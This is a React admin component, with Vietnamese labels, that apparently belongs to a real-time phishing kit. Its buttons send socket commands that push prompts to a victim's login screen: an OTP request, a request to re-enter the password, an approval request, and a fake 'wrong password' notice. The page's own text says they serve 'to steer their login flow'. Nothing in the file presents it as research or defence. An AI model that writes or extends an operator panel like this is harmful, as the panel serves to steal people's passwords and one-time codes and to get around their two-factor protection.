import React from 'react';
import { Button } from '@/components/ui/button';
import { toast } from 'react-toastify';
import { Eye, KeyRound, ShieldAlert, ShieldCheck, FileWarning, FileUp } from 'lucide-react';
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
import { useSocket } from '@/contexts/AppContext';

const UserAppearancePage = () => {
  const socket = useSocket();

  const handleAction = (action) => {
    if (socket) {
      socket.emit('admin_action', { action });
      let message = '';
      switch(action) {
        case 'request_approval':
          message = 'Đã gửi yêu cầu phê duyệt tới người dùng.';
          break;
        case 'request_otp':
          message = 'Đã gửi yêu cầu nhập mã OTP tới người dùng.';
          break;
        case 'request_password':
          message = 'Đã gửi yêu cầu nhập lại mật khẩu tới người dùng.';
          break;
        case 'request_wrong_password':
          message = 'Đã gửi thông báo sai mật khẩu tới người dùng.';
          break;
        default:
          message = `Đã thực hiện hành động: ${action}`;
      }
      toast.success(message);
    } else {
      toast.error('Không thể kết nối tới máy chủ. Vui lòng thử lại.');
    }
  };

  const actions = [
    { id: 'request_approval', label: 'Yêu cầu Phê duyệt', icon: ShieldCheck, color: 'bg-green-500 hover:bg-green-600' },
    { id: 'request_otp', label: 'Yêu cầu OTP', icon: KeyRound, color: 'bg-blue-500 hover:bg-blue-600' },
    { id: 'request_password', label: 'Yêu cầu Mật khẩu', icon: ShieldAlert, color: 'bg-yellow-500 hover:bg-yellow-600' },
    { id: 'request_wrong_password', label: 'Yêu cầu Sai Mật khẩu', icon: FileWarning, color: 'bg-red-500 hover:bg-red-600' },
  ];

  return (
    <Card className="bg-card/80 backdrop-blur-sm">
      <CardHeader>
        <CardTitle className="flex items-center">
          <Eye className="mr-2 h-5 w-5" />
          <span>Điều Khiển Giao Diện Người Dùng</span>
        </CardTitle>
      </CardHeader>
      <CardContent>
        <p className="text-muted-foreground mb-4">
          Gửi các yêu cầu tương tác tới giao diện của người dùng để điều hướng luồng đăng nhập của họ.
        </p>
        <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4">
          {actions.map(({ id, label, icon: Icon, color }) => (
            <Button
              key={id}
              onClick={() => handleAction(id)}
              className={`flex-1 text-white font-semibold py-6 text-base ${color} transition-all duration-300 transform hover:-translate-y-1 hover:shadow-lg`}
            >
              <Icon className="mr-2 h-5 w-5" />
              {label}
            </Button>
          ))}
        </div>
      </CardContent>
    </Card>
  );
};

export default UserAppearancePage;